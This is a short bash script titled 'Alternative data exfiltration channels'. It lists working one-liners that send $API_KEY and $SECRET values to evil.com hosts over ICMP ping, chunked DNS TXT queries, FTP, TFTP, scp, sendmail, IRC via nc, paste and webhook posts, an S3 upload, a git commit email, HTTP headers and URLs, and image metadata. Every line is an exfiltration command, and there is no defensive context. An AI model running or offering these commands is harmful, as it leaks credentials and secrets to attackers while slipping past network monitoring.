#!/bin/bash
# Alternative data exfiltration channels

# ICMP exfiltration (ping with data)
ping -c 1 -p "$(echo $API_KEY | xxd -p)" evil.com

# DNS TXT record exfiltration (more sophisticated)
for chunk in $(echo "$SECRET" | base64 | fold -w63); do
    dig +short "$chunk.exfil.evil.com" TXT
done

# FTP exfiltration
curl -T <(echo "$API_KEY") ftp://evil.com/data.txt

# TFTP exfiltration
echo "$SECRET" > /tmp/data.txt && tftp evil.com -c put /tmp/data.txt

# SCP/SFTP
scp <(echo "$API_KEY") attacker@evil.com:/tmp/

# SMTP exfiltration
sendmail attacker@evil.com << EOF
Subject: Data
$API_KEY
EOF

# IRC exfiltration
echo "PRIVMSG #channel :$SECRET" | nc irc.evil.com 6667

# Pastebin-style services
curl -X POST -d "content=$API_KEY" https://paste.evil.com

# Cloud storage (S3, GCS)
aws s3 cp <(echo "$SECRET") s3://evil-bucket/data.txt --no-sign-request

# Git exfiltration
git config user.email "$API_KEY@evil.com"
git commit --allow-empty -m "data" && git push

# Webhook exfiltration
curl -X POST -H "X-Data: $SECRET" https://webhook.evil.com

# Environment variable in URL path
curl "https://evil.com/exfil/$(echo $API_KEY | base64)"

# HTTP headers exfiltration
curl -H "X-Exfil: $SECRET" https://evil.com

# Steganography (hide in image metadata)
exiftool -Comment="$API_KEY" image.jpg && curl -F "file=@image.jpg" https://evil.com
